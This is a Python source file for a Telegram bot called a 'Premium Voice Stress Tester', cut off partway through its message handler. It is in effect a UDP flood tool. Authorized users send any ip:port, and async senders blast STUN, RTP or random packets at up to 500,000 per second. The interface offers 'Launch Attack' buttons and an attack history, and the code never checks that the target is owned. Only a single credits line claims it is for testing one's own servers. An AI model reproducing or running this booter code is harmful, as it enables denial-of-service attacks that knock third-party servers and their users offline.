"""
🎙️ Premium Voice Stress Tester — Full Beauty Edition
👑 Author: Bobby Maharaj

Features
--------
• One-tap 🚀 Launch Attack (ip:port)
• STUN • RTP • Random UDP packets
• Live progress bar + PPS sparkline
• Auto-refresh panel while attack runs
• ⚡ Inline Ping (UDP RTT)
• Advanced admin panel: stats, history, live logs, broadcast
• Persistent user access control
• Premium sticker hooks + premium emoji styling
"""

import asyncio
import json
import logging
import os
import random
import socket
import struct
import time
from collections import deque
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# --- Python 3.10+ / 3.14 compatibility fix for Pyrogram ---
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())
# ----------------------------------------------------------

from pyrogram import Client, filters
from pyrogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
)

# ===================================================================
# Logging (console + in-memory ring buffer)
# ===================================================================
LOG_FORMAT = "%(asctime)s | %(levelname)-7s | %(message)s"
DATE_FORMAT = "%H:%M:%S"


class RingLogHandler(logging.Handler):
    def __init__(self, capacity: int = 400):
        super().__init__()
        self.capacity = capacity
        self.buffer: deque = deque(maxlen=capacity)

    def emit(self, record):
        try:
            self.buffer.append(self.format(record))
        except Exception:
            pass

    def tail(self, n: int = 25) -> List[str]:
        return list(self.buffer)[-n:]

    def clear(self):
        self.buffer.clear()


LOG_BUFFER = RingLogHandler()
logging.basicConfig(level=logging.INFO, format=LOG_FORMAT, datefmt=DATE_FORMAT)
LOG_BUFFER.setFormatter(logging.Formatter(LOG_FORMAT, datefmt=DATE_FORMAT))
logging.getLogger().addHandler(LOG_BUFFER)
logger = logging.getLogger("VoiceStress")

# ===================================================================
# Config
# ===================================================================
API_ID = int(os.getenv("API_ID", 6))
API_HASH = os.getenv("API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e")
BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
SUPER_ADMIN_ID = int(os.getenv("SUPER_ADMIN_ID", 0))

if not BOT_TOKEN:
    raise SystemExit("Missing env var: BOT_TOKEN")
if not SUPER_ADMIN_ID:
    raise SystemExit("Missing env var: SUPER_ADMIN_ID")

ACCESS_FILE = Path("authorized_users.json")

# Premium sticker hooks (optional)
PREMIUM_STICKERS: Dict[str, str] = {
    "welcome": os.getenv("STICKER_WELCOME", "").strip(),
    "launch":  os.getenv("STICKER_LAUNCH",  "").strip(),
    "stop":    os.getenv("STICKER_STOP",    "").strip(),
    "admin":   os.getenv("STICKER_ADMIN",   "").strip(),
    "error":   os.getenv("STICKER_ERROR",   "").strip(),
    "stats":   os.getenv("STICKER_STATS",   "").strip(),
}

CREDITS    = "👑 **Bobby Maharaj**"
SEP_THICK  = "━━━━━━━━━━━━━━━━━━━━━━━━"
SEP_THIN   = "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"

REFRESH_INTERVAL = 5      # seconds — auto-refresh cadence while running
SAMPLE_INTERVAL  = 1      # seconds — PPS sampler cadence
SPARK_LEN        = 20     # number of PPS samples kept for sparkline

# ===================================================================
# Helpers
# ===================================================================
def fmt_num(n: int) -> str:
    return f"{n:,}"


def fmt_duration(sec: float) -> str:
    sec = int(sec)
    h, r = divmod(sec, 3600)
    m, s = divmod(r, 60)
    if h:
        return f"{h}h {m}m {s}s"
    if m:
        return f"{m}m {s}s"
    return f"{s}s"


def parse_target(text: str) -> Optional[Tuple[str, int]]:
    text = text.strip()
    if ":" not in text:
        return None
    ip, port_s = text.rsplit(":", 1)
    ip = ip.strip()
    try:
        port = int(port_s.strip())
    except ValueError:
        return None
    if not (0 < port < 65536):
        return None
    parts = ip.split(".")
    if len(parts) == 4:
        try:
            if all(0 <= int(p) <= 255 for p in parts):
                return ip, port
        except ValueError:
            pass
    if ip and all(c.isalnum() or c in ".-_" for c in ip):
        return ip, port
    return None


def progress_bar(elapsed: float, total: float, width: int = 16) -> str:
    if total <= 0:
        return "`∞  (until stopped)`"
    pct = min(1.0, max(0.0, elapsed / total))
    filled = int(round(pct * width))
    bar = "█" * filled + "░" * (width - filled)
    return f"`[{bar}]` **{int(pct * 100)}%**"


def sparkline(values: List[int]) -> str:
    if not values:
        return "`—`"
    blocks = "▁▂▃▄▅▆▇█"
    lo, hi = min(values), max(values)
    if hi == lo:
        return "`" + blocks[3] * len(values) + "`"
    rng = hi - lo
    return "`" + "".join(blocks[min(7, int((v - lo) / rng * 7))] for v in values) + "`"


# ===================================================================
# Access store (persistent)
# ===================================================================
class AccessStore:
    def __init__(self, path: Path, super_admin: int):
        self.path = path
        self.super_admin = super_admin
        self.users: Set[int] = {super_admin}
        self._load()

    def _load(self):
        if self.path.exists():
            try:
                data = json.loads(self.path.read_text())
                self.users = set(data.get("authorized", [])) | {self.super_admin}
            except Exception as e:
                logger.warning("Failed to load access file: %s", e)

    def _save(self):
        self.path.write_text(json.dumps({"authorized": sorted(self.users)}, indent=2))

    def add(self, uid: int) -> bool:
        if uid in self.users:
            return False
        self.users.add(uid)
        self._save()
        return True

    def revoke(self, uid: int) -> bool:
        if uid == self.super_admin or uid not in self.users:
            return False
        self.users.remove(uid)
        self._save()
        return True

    def is_authorized(self, uid: int) -> bool:
        return uid in self.users

    def list(self) -> List[int]:
        return sorted(self.users)


# ===================================================================
# Packet builders
# ===================================================================
def build_stun_binding_request() -> bytes:
    return struct.pack(">HHI", 0x0001, 0x0000, 0x2112A442) + os.urandom(12)


def build_rtp_packet(seq: int, ssrc: int) -> bytes:
    b1 = (2 << 6)
    b2 = (0 << 7) | 111
    ts = random.randint(0, 0xFFFFFFFF)
    payload = os.urandom(80)
    return struct.pack(">BBHII", b1, b2, seq & 0xFFFF, ts, ssrc) + payload


def build_random_packet() -> bytes:
    return os.urandom(random.randint(64, 512))


# ===================================================================
# Packet Sender
# ===================================================================
class PacketSender:
    def __init__(self, target_ip: str, target_port: int, pps: int, packet_type: str):
        self.target_ip = target_ip
        self.target_port = target_port
        self.pps = max(1, pps)
        self.packet_type = packet_type
        self.sent = 0
        self.failed = 0
        self.running = False
        self._seq = 0
        self._ssrc = random.randint(1, 0xFFFFFFFF)
        self._task: Optional[asyncio.Task] = None

    def _build_packet(self) -> bytes:
        if self.packet_type == "stun":
            return build_stun_binding_request()
        if self.packet_type == "rtp":
            self._seq = (self._seq + 1) & 0xFFFF
            return build_rtp_packet(self._seq, self._ssrc)
        return build_random_packet()

    async def _loop(self):
        loop = asyncio.get_running_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        except OSError:
            pass

        interval = 1.0 / self.pps
        next_send = loop.time()
        try:
            while self.running:
                now = loop.time()
                if now >= next_send:
                    try:
                        await loop.sock_sendto(
                            sock, self._build_packet(),
                            (self.target_ip, self.target_port)
                        )
                        self.sent += 1
                    except Exception:
                        self.failed += 1
                    next_send += interval
                    if next_send < now:
                        next_send = now + interval
                else:
                    await asyncio.sleep(min(next_send - now, 0.001))
        finally:
            sock.close()

    def start(self):
        self.running = True
        self._task = asyncio.create_task(self._loop())

    async def stop(self):
        self.running = False
        if self._task:
            try:
                await asyncio.wait_for(self._task, timeout=3)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._task.cancel()


# ===================================================================
# Data classes
# ===================================================================
@dataclass
class StressConfig:
    target_ip: Optional[str] = None
    target_port: Optional[int] = None
    pps: int = 200
    senders: int = 1
    duration: int = 60
    packet_type: str = "stun"
    running: bool = False
    started_at: float = 0.0


@dataclass
class AttackRecord:
    target: str
    pps: int
    senders: int
    duration: int
    packet_type: str
    started_at: float
    ended_at: float
    sent: int
    failed: int

    def summary(self) -> str:
        return (
            f"`{self.target}` • `{self.pps}x{self.senders}` "
            f"• `{self.packet_type.upper()}` • "
            f"`{fmt_num(self.sent)}` sent / `{fmt_num(self.failed)}` fail • "
            f"`{fmt_duration(self.ended_at - self.started_at)}`"
        )


# ===================================================================
# Main Manager
# ===================================================================
class StressManager:
    def __init__(self):
        self.config = StressConfig()
        self.access = AccessStore(ACCESS_FILE, SUPER_ADMIN_ID)
        self.senders: List[PacketSender] = []
        self._auto_stop_task: Optional[asyncio.Task] = None
        self._refresh_task: Optional[asyncio.Task] = None
        self._sampler_task: Optional[asyncio.Task] = None

        self.pending: Dict[int, Optional[str]] = {}
        self.panel_messages: Dict[int, Tuple[int, int]] = {}  # uid -> (chat_id, message_id)
        self.pps_samples: deque = deque(maxlen=SPARK_LEN)

        self.cum_sent = 0
        self.cum_failed = 0
        self.history: List[AttackRecord] = []
        self.started_boot = time.time()
        self._current_start_ts: float = 0.0

        self.bot = Client(
            "voice_stress_bot",
            api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN
        )
        self._register_handlers()

    # -----------------------------------------------------------------
    # Helpers
    # -----------------------------------------------------------------
    async def _sticker(self, chat_id: int, key: str):
        fid = PREMIUM_STICKERS.get(key)
        if not fid:
            return
        try:
            await self.bot.send_sticker(chat_id, fid)
        except Exception:
            pass

    async def _typing(self, chat_id: int):
        try:
            await self.bot.send_chat_action(chat_id, "typing")
        except Exception:
            pass

    def _track_panel(self, uid: int, chat_id: int, message_id: int):
        self.panel_messages[uid] = (chat_id, message_id)

    # -----------------------------------------------------------------
    # Bot handlers
    # -----------------------------------------------------------------
    def _register_handlers(self):
        bot = self.bot

        @bot.on_message(filters.command(["start"]) & filters.private)
        async def cmd_start(_, msg: Message):
            if not self.access.is_authorized(msg.from_user.id):
                return await msg.reply_text(
                    f"🚫 **Access Denied**\n{SEP_THICK}\n"
                    "You are **not authorized** to use this bot.\n"
                    "Ask the super admin for access.\n\n"
                    f"🪪 Your ID: `{msg.from_user.id}`\n"
                    f"_Powered by {CREDITS}_"
                )
            await self._sticker(msg.chat.id, "welcome")
            await msg.reply_text(
                f"✨ **Welcome to the Premium Voice Stress Tester** ✨\n"
                f"{SEP_THICK}\n"
                f"Hello, **{msg.from_user.first_name}** 👋\n"
                f"Use the panel below to control the stress engine.\n"
                f"{SEP_THIN}\n"
                f"🚀 Tap **Launch Attack** for a one-tap test,\n"
                f"or fine-tune the config in the admin panel.\n\n"
                f"👑 **Credits:** {CREDITS}"
            )
            await self.show_panel(msg)

        @bot.on_message(filters.command(["admin", "panel"]) & filters.private)
        async def cmd_admin(_, msg: Message):
            if not self.access.is_authorized(msg.from_user.id):
                return
            await self.show_panel(msg)

        @bot.on_message(filters.command("help") & filters.private)
        async def cmd_help(_, msg: Message):
            if not self.access.is_authorized(msg.from_user.id):
                return
            await self._typing(msg.chat.id)
            await msg.reply_text(
                f"📖 **Help — Premium Voice Stress Tester**\n"
                f"{SEP_THICK}\n"
                f"• `/start` — welcome + panel\n"
                f"• `/admin` — open admin panel\n"
                f"• `/stats` — cumulative statistics\n"
                f"• `/history` — last attacks\n"
                f"• `/credits` — author credits\n"
                f"{SEP_THIN}\n"
                f"**Quick Launch**\n"
                f"1. Tap **🚀 Launch Attack**\n"
                f"2. Send `ip:port` (e.g. `1.2.3.4:3478`)\n"
                f"3. Attack starts immediately\n\n"
                f"**Beauty features**\n"
                f"• 📊 Live progress bar\n"
                f"• 📈 PPS sparkline graph\n"
                f"• 🔄 Auto-refresh panel every {REFRESH_INTERVAL}s\n"
                f"• ⚡ Ping target (UDP RTT)\n\n"
                f"👑 **Author:** {CREDITS}"
            )

        @bot.on_message(filters.command("credits") & filters.private)
        async def cmd_credits(_, msg: Message):
            await msg.reply_text(
                f"👑 **Credits**\n{SEP_THICK}\n"
                f"🧠 **Author:** {CREDITS}\n"
                f"⚙️ **Engine:** Custom async UDP stress core\n"
                f"💬 **Framework:** Pyrogram\n"
                f"🎨 **UI:** Premium sticker/emoji theme\n"
                f"{SEP_THIN}\n"
                f"_Built for stress-testing your own voice servers._"
            )

        @bot.on_message(filters.command("stats") & filters.private)
        async def cmd_stats(_, msg: Message):
            if not self.access.is_authorized(msg.from_user.id):
                return
            await self._typing(msg.chat.id)
            await msg.reply_text(self.stats_text(), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Back to Panel", callback_data="back")]
            ]))

        @bot.on_message(filters.command("history") & filters.private)
        async def cmd_history(_, msg: Message):
            if not self.access.is_authorized(msg.from_user.id):
                return
            await self._typing(msg.chat.id)
            await msg.reply_text(self.history_text(), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Back to Panel", callback_data="back")]
            ]))

        @bot.on_message(filters.command("logs") & filters.private)
        async def cmd_logs(_, msg: Message):
            if msg.from_user.id != SUPER_ADMIN_ID:
                return
            await msg.reply_text(self.logs_text(), reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="logs"),
                 InlineKeyboardButton("🧽 Clear", callback_data="logs_clear")],
                [InlineKeyboardButton("⬅️ Back", callback_data="back")],
            ]))

        @bot.on_callback_query()
        async def on_callback(_, query: CallbackQuery):
            if not self.access.is_authorized(query.from_user.id):
                return await query.answer("🚫 Unauthorized.", show_alert=True)
            try:
                await self.handle_callback(query)
            except Exception as e:
                logger.exception("Callback error: %s", e)
                await query.answer("⚠️ Internal error.", show_alert=True)

    # -----------------------------------------------------------------
    # Panel rendering
    # -----------------------------------------------------------------
    async def panel_text(self) -> str:
        c = self.config
        status = "🟢 **RUNNING**" if c.running else "🔴 **STOPPED**"

        if c.running and c.started_at:
            elapsed = time.time() - c.started_at
            elapsed_s = int(elapsed)
        else:
            elapsed, elapsed_s = 0, 0

        total_sent = self.cum_sent + sum(s.sent for s in self.senders)
        total_failed = self.cum_failed + sum(s.failed for s in self.senders)
        total_pps = c.pps * c.senders
        duration_label = f"{c.duration}s" if c.duration else "∞"
        target = f"{c.target_ip or '—'}:{c.target_port or '—'}"

        bar = progress_bar(elapsed, c.duration if c.duration > 0 else 0) \
            if c.running else "`—————  idle  —————`"

        spark = sparkline(list(self.pps_samples)) \
            if c.running and self.pps_samples else "`—`"

        return (
            f"🎙️ **PREMIUM VOICE STRESS TESTER** 🎙️\n"
            f"{SEP_THICK}\n"
            f"📡 Status     : {status}\n"
            f"🎯 Target     : `{target}`\n"
            f"⚡ Rate       : `{c.pps}` PPS × `{c.senders}` = `{total_pps}` PPS\n"
            f"⏱️ Duration   : `{duration_label}`  •  elapsed `{elapsed_s}s`\n"
            f"📊 Progress   : {bar}\n"
            f"📦 Packet     : `{c.packet_type.upper()}`\n"
            f"{SEP_THIN}\n"
            f"📤 Sent       : `{fmt_num(total_sent)}`\n"
            f"❌ Failed     : `{fmt_num(total_failed)}`\n"
            f"📈 PPS trend  : {spark}\n"
            f"{SEP_THICK}\n"
            f"👑 *Author:* {CREDITS}"
        )

    def panel_kb(self, user_id: int) -> InlineKeyboardMarkup:
        c = self.config
        rows = [
            [InlineKeyboardButton("🚀 Launch Attack", callback_data="launch"),
             InlineKeyboardButton("🎯 Set Target",    callback_data="cfg_target")],
            [InlineKeyboardButton("📶 Rate (PPS)",    callback_data="cfg_pps"),
             InlineKeyboardButton("🔀 Senders",       callback_data="cfg_senders")],
            [InlineKeyboardButton("⏱️ Duration",       callback_data="cfg_duration"),
             InlineKeyboardButton(f"📦 {c.packet_type.upper()}", callback_data="cfg_type")],
            [InlineKeyboardButton("⚡ Ping Target",    callback_data="ping"),
             InlineKeyboardButton("📊 Stats",         callback_data="stats")],
            [InlineKeyboardButton("📜 History",       callback_data="history"),
             InlineKeyboardButton("🔄 Refresh",       callback_data="refresh")],
            [InlineKeyboardButton("🧹 Reset Counters", callback_data="reset_counters")],
        ]
        if c.running:
            rows.append([InlineKeyboardButton("⛔ STOP ATTACK", callback_data="stop")])
        else:
            rows.append([InlineKeyboardButton("▶️ START ATTACK", callback_data="start")])
        if user_id == SUPER_ADMIN_ID:
            rows.append([
                InlineKeyboardButton("👥 Users",    callback_data="users"),
                InlineKeyboardButton("📜 Logs",     callback_data="logs"),
            ])
            rows.append([
                InlineKeyboardButton("📢 Broadcast", callback_data="broadcast"),
                InlineKeyboardButton("ℹ️ Bot Info",  callback_data="botinfo"),
            ])
        rows.append([InlineKeyboardButton("❓ Help", callback_data="help")])
        return InlineKeyboardMarkup(rows)

    async def show_panel(self, target):
        text = await self.panel_text()
        uid = target.from_user.id
        kb = self.panel_kb(uid)

        if isinstance(target, Message):
            sent = await target.reply_text(text, reply_markup=kb)
            self._track_panel(uid, sent.chat.id, sent.id)
        else:
            try:
                await target.message.edit_text(text, reply_markup=kb)
                self._track_panel(uid, target.message.chat.id, target.message.id)
            except Exception:
                pass

    # -----------------------------------------------------------------
    # Panels: stats / history / logs
    # -----------------------------------------------------------------
    def stats_text(self) -> str:
        total_lifetime = self.cum_sent + sum(s.sent for s in self.senders)
        total_failed = self.cum_failed + sum(s.failed for s in self.senders)
        uptime = fmt_duration(time.time() - self.started_boot)
        return (
            f"📊 **Cumulative Statistics**\n"
            f"{SEP_THICK}\n"
            f"🕒 Bot uptime        : `{uptime}`\n"
            f"🧾 Attacks launched  : `{len(self.history)}`\n"
            f"📤 Packets sent      : `{fmt_num(total_lifetime)}`\n"
            f"❌ Packets failed    : `{fmt_num(total_failed)}`\n"
            f"👥 Authorized users  : `{len(self.access.list())}`\n"
            f"{SEP_THICK}\n"
            f"👑 *Author:* {CREDITS}"
        )

    def history_text(self) -> str:
        if not self.history:
            body = "_No attacks recorded yet._"
        else:
            lines = []
            for i, r in enumerate(reversed(self.history[-10:]), 1):
                lines.append(f"`{i}.` {r.summary()}")
            body = "\n".join(lines)
        return (
            f"📜 **Attack History** (last 10)\n"
            f"{SEP_THICK}\n{body}\n{SEP_THICK}\n"
            f"👑 *Author:* {CREDITS}"
        )

    def logs_text(self) -> str:
        lines = LOG_BUFFER.tail(25)
        if not lines:
            return f"📜 **Logs**\n{SEP_THICK}\n_No log entries yet._"
        body = "\n".join(f"`{l}`" for l in lines)
        return f"📜 **Live Logs**\n{SEP_THICK}\n{body}"

    # -----------------------------------------------------------------
    # Callback router
    # -----------------------------------------------------------------
    async def handle_callback(self, q: CallbackQuery):
        data = q.data
        uid = q.from_user.id

        if data == "refresh":
            await self.show_panel(q)
            return await q.answer("Refreshed ✨")

        if data == "back":
            await self.show_panel(q)
            return await q.answer()

        if data == "help":
            await q.answer(
                "🚀 Launch → send ip:port. Fine-tune in the panel.",
                show_alert=True
            )
            return

        if data == "botinfo":
            await q.message.edit_text(
                f"ℹ️ **Bot Information**\n{SEP_THICK}\n"
                f"🤖 Name       : Premium Voice Stress Tester\n"
                f"🧠 Engine     : Async UDP (STUN / RTP / Random)\n"
                f"⚙️ Framework  : Pyrogram\n"
                f"📅 Session    : `{int(self.started_boot)}`\n"
                f"🆔 Super admin: `{SUPER_ADMIN_ID}`\n"
                f"{SEP_THICK}\n"
                f"👑 **Author:** {CREDITS}",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅️ Back", callback_data="back")]
                ])
            )
            return await q.answer()

        if data == "reset_counters":
            if self.config.running:
                return await q.answer("Stop the test first.", show_alert=True)
            self.cum_sent = 0
            self.cum_failed = 0
            self.pps_samples.clear()
            await self.show_panel(q)
            return await q.answer("Counters reset 🧹")

        # ---- Ping ----
        if data == "ping":
            c = self.config
            if not c.target_ip or not c.target_port:
                return await q.answer("Set a target first.", show_alert=True)
            await q.answer("Pinging… ⚡")
            await self._typing(q.message.chat.id)
            rtt, msg = await self.ping_target(c.target_ip, c.target_port)
            if rtt is not None:
                await q.message.reply_text(
                    f"⚡ **Ping Result**\n{SEP_THICK}\n"
                    f"🎯 Target : `{c.target_ip}:{c.target_port}`\n"
                    f"⏱️ RTT    : `{msg}`\n"
                    f"📡 Status : ✅ reachable"
                )
            else:
                await q.message.reply_text(
                    f"⚡ **Ping Result**\n{SEP_THICK}\n"
                    f"🎯 Target : `{c.target_ip}:{c.target_port}`\n"
                    f"⚠️ {msg}"
                )
            return

        # ---- Launch (quick flow) ----
        if data == "launch":
            self.pending[uid] = "launch"
            await q.message.reply_text(
                f"🚀 **Quick Launch**\n{SEP_THICK}\n"
                f"Send the target in `ip:port` format\n"
                f"Example: `1.2.3.4:3478`\n\n"
                f"⚡ Current config:\n"
                f"• Rate: `{self.config.pps}` PPS × `{self.config.senders}`\n"
                f"• Duration: `{self.config.duration}s`\n"
                f"• Packet: `{self.config.packet_type.upper()}`"
            )
            return await q.answer()

        # ---- Config inputs ----
        if data == "cfg_target":
            self.pending[uid] = "target"
            await q.message.reply_text(
                "🎯 Send target in format `ip:port`\nExample: `1.2.3.4:3478`"
            )
            return await q.answer()

        if data == "cfg_pps":
            self.pending[uid] = "pps"
            await q.message.reply_text("📶 Send total packets/sec (1–100000).")
            return await q.answer()

        if data == "cfg_senders":
            self.pending[uid] = "senders"
            await q.message.reply_text("🔀 Send number of parallel sender tasks (1–64).")
            return await q.answer()

        if data == "cfg_duration":
            self.pending[uid] = "duration"
            await q.message.reply_text("⏱️ Send duration in seconds (0 = until stopped).")
            return await q.answer()

        if data == "cfg_type":
            order = ["stun", "rtp", "random"]
            self.config.packet_type = order[(order.index(self.config.packet_type) + 1) % 3]
            await self.show_panel(q)
            return await q.answer(f"Packet → {self.config.packet_type.upper()}")

        # ---- Start / Stop ----
        if data == "start":
            ok, err = await self.start_test()
            await self.show_panel(q)
            return await q.answer(err or "Started ✅", show_alert=not ok)

        if data == "stop":
            await self.stop_test()
            await self._sticker(q.message.chat.id, "stop")
            await self.show_panel(q)
            return await q.answer("Stopped ⛔")

        # ---- Stats / history ----
        if data == "stats":
            await q.message.edit_text(
                self.stats_text(),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="stats")],
                    [InlineKeyboardButton("⬅️ Back", callback_data="back")],
                ])
            )
            return await q.answer()

        if data == "history":
            await q.message.edit_text(
                self.history_text(),
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh", callback_data="history")],
                    [InlineKeyboardButton("⬅️ Back", callback_data="back")],
                ])
            )
            return await q.answer()

        # ---- Logs (super admin) ----
        if data == "logs":
            if uid != SUPER_ADMIN_ID:
                return await q.answer("🚫 Super admin only.", show_alert=True)
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="logs"),
                 InlineKeyboardButton("🧽 Clear", callback_data="logs_clear")],
                [InlineKeyboardButton("⬅️ Back", callback_data="back")],
            ])
            try:
                await q.message.edit_text(self.logs_text(), reply_markup=kb)
            except Exception:
                await q.message.reply_text(self.logs_text(), reply_markup=kb)
            return await q.answer()

        if data == "logs_clear":
            if uid != SUPER_ADMIN_ID:
                return await q.answer("🚫 Super admin only.", show_alert=True)
            LOG_BUFFER.clear()
            await q.answer("Logs cleared 🧽")
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Refresh", callback_data="logs"),
                 InlineKeyboardButton("🧽 Clear", callback_data="logs_clear")],
                [InlineKeyboardButton("⬅️ Back", callback_data="back")],
            ])
            try:
                await q.message.edit_text(self.logs_text(), reply_markup=kb)
            except Exception:
                pass
            return

        # ---- Users (super admin) ----
        if data == "users" and uid == SUPER_ADMIN_ID:
            return await self.show_users(q)

        if data == "user_add":
            if uid != SUPER_ADMIN_ID:
                return await q.answer("🚫 Super admin only.", show_alert=True)
            self.pending[uid] = "user_add"
            await q.message.reply_text(
                "👤 Send the **numeric Telegram user ID** to authorize."
            )
            return await q.answer()

        if data.startswith("user_del:"):
            target_id = int(data.split(":", 1)[1])
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton("✅ Yes, revoke",
                                     callback_data=f"user_del_confirm:{target_id}"),
                InlineKeyboardButton("❌ Cancel", callback_data="users"),
            ]])
            await q.message.edit_text(
                f"⚠️ **Revoke access**\n{SEP_THICK}\n"
                f"User: `{target_id}`\n\nProceed?",
                reply_markup=kb
            )
            return await q.answer()

        if data.startswith("user_del_confirm:"):
            target_id = int(data.split(":", 1)[1])
            ok = self.access.revoke(target_id)
            await q.answer("Revoked ✅" if ok else "Cannot revoke.", show_alert=True)
            return await self.show_users(q)

        # ---- Broadcast (super admin) ----
        if data == "broadcast":
            if uid != SUPER_ADMIN_ID:
                return await q.answer("🚫 Super admin only.", show_alert=True)
            self.pending[uid] = "broadcast"
            await q.message.reply_text("📢 Send the message to broadcast.")
            return await q.answer()

    # -----------------------------------------------------------------
    # User management
    # -----------------------------------------------------------------
    async def show_users(self, q: CallbackQuery):
        ids = self.access.list()
        lines = [f"👥 **Authorized Users**  (`{len(ids)}`)", SEP_THICK]
        rows = []
        for i in ids:
            tag = " ⭐ *super admin*" if i == SUPER_ADMIN_ID else ""
            lines.append(f"• `{i}`{tag}")
            if i != SUPER_ADMIN_ID:
                rows.append([InlineKeyboardButton(
                    f"❌ Revoke {i}", callback_data=f"user_del:{i}"
                )])
        rows.append([InlineKeyboardButton("➕ Add User", callback_data="user_add")])
        rows.append([InlineKeyboardButton("⬅️ Back", callback_data="back")])
        text = "\n".join(lines)
        try:
            await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(rows))
        except Exception:
            await q.message.reply_text(text, reply_markup=InlineKeyboardMarkup(rows))
        await q.answer()

    # -----------------------------------------------------------------
    # Ping
    # -----------------------------------------------------------------
    async def ping_target(self, ip: str, port: int, timeout: float = 2.0):
        loop = asyncio.get_running_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        try:
            probe = build_stun_binding_request()
            t0 = loop.time()
            try:
                await loop.sock_sendto(sock, probe, (ip, port))
            except Exception as e:
                return None, f"Send failed: `{e}`"
            try:
                data = await asyncio.wait_for(
                    loop.sock_recv(sock, 4096), timeout=timeout
                )
                rtt = (loop.time() - t0) * 1000.0
                return rtt, f"{rtt:.1f} ms • `{len(data)} B` reply"
            except asyncio.TimeoutError:
                return None, ("No UDP reply within timeout.\n"
                              "_UDP is connectionless — server may still be receiving._")
        finally:
            sock.close()

    # -----------------------------------------------------------------
    # Live refresh + sampler
    # -----------------------------------------------------------------
    async def _auto_refresh_loop(self):
        try:
            while self.config.running:
                await asyncio.sleep(REFRESH_INTERVAL)
                if not self.config.running:
                    break
                text = await self.panel_text()
                for uid, (cid, mid) in list(self.panel_messages.items()):
                    if not self.access.is_authorized(uid):
                        continue
                    try:
                        await self.bot.edit_message_text(
                            cid, mid, text,
                            reply_markup=self.panel_kb(uid)
                        )
                    except Exception:
                        pass
        except asyncio.CancelledError:
            pass

    async def _sampler_loop(self):
        last = sum(s.sent for s in self.senders)
        try:
            while self.config.running:
                await asyncio.sleep(SAMPLE_INTERVAL)
                if not self.config.running:
                    break
                now = sum(s.sent for s in self.senders)
                self.pps_samples.append(max(0, now - last))
                last = now
        except asyncio.CancelledError:
            pass

    # -----------------------------------------------------------------
    # Attack control
    # -----------------------------------------------------------------
    async def start_test(self):
        c = self.config
        if c.running:
            return False, "Already running."
        if not c.target_ip or not c.target_port:
            return False, "Set a target first."
        if c.pps * c.senders > 500_000:
            return False, "Rate too high (max 500k PPS total)."

        c.running = True
        c.started_at = time.time()
        self._current_start_ts = c.started_at
        self.pps_samples.clear()

        per_sender_pps = max(1, c.pps // max(1, c.senders))
        for _ in range(c.senders):
            s = PacketSender(c.target_ip, c.target_port, per_sender_pps, c.packet_type)
            s.start()
            self.senders.append(s)

        if c.duration > 0:
            self._auto_stop_task = asyncio.create_task(self._auto_stop(c.duration))

        self._refresh_task = asyncio.create_task(self._auto_refresh_loop())
        self._sampler_task = asyncio.create_task(self._sampler_loop())

        logger.info(
            "🚀 START  %s:%s  rate=%s pps x%s  type=%s  dur=%ss",
            c.target_ip, c.target_port, c.pps, c.senders, c.packet_type, c.duration
        )
        return True, None

    async def _auto_stop(self, seconds: int):
        try:
            await asyncio.sleep(seconds)
            if self.config.running:
                await self.stop_test(from_auto=True)
        except asyncio.CancelledError:
            pass

    async def stop_test(self, from_auto: bool = False):
        if not self.config.running and not self.senders:
            return
        self.config.running = False

        frozen_sent = sum(s.sent for s in self.senders)
        frozen_failed = sum(s.failed for s in self.senders)
        for s in self.senders:
            self.cum_sent += s.sent
            self.cum_failed += s.failed

        for s in self.senders:
            await s.stop()
        self.senders.clear()

        for t in (self._refresh_task, self._sampler_task):
            if t and not t.done():
                t.cancel()
        self._refresh_task = None
        self._sampler_task = None

        if self._current_start_ts:
            c = self.config
            self.history.append(AttackRecord(
                target=f"{c.target_ip}:{c.target_port}",
                pps=c.pps, senders=c.senders,
                duration=c.duration, packet_type=c.packet_type,
                started_at=self._current_start_ts,
                ended_at=time.time(),
                sent=frozen_sent, failed=frozen_failed,
            ))
            self.history = self.history[-50:]
            self._current_start_ts = 0.0

        if self._auto_stop_task and not from_auto:
            current = asyncio.current_task()
            if current is not self._auto_stop_task:
                self._auto_stop_task.cancel()
            self._auto_stop_task = None
        elif from_auto:
            self._auto_stop_task = None

        logger.info(
            "🛑 STOP  sent=%s failed=%s  (auto=%s)",
            fmt_num(frozen_sent), fmt_num(frozen_failed), from_auto
        )

        # Final panel update
        text = await self.panel_text()
        for uid, (cid, mid) in list(self.panel_messages.items()):
            if not self.access.is_authorized(uid):
                continue
            try:
                await self.bot.edit_message_text(
                    cid, mid, text, reply_markup=self.panel_kb(uid)
                )
            except Exception:
                pass

    # -----------------------------------------------------------------
    # Message → config router
    # -----------------------------------------------------------------
    async def handle_config_message(self, msg: Message) -> bool:
        if not self.access.is_authorized(msg.from_user.id):
            return False
        text = (msg.text or "").strip()
        if not text:
            return False

        uid = msg.from_user.id
        action = self.pending.get(uid)

        # ---- Broadcast (super admin) ----
        if action == "broadcast":
            if uid != SUPER_ADMIN_ID:
                self.pending.pop(uid, None)
                return False
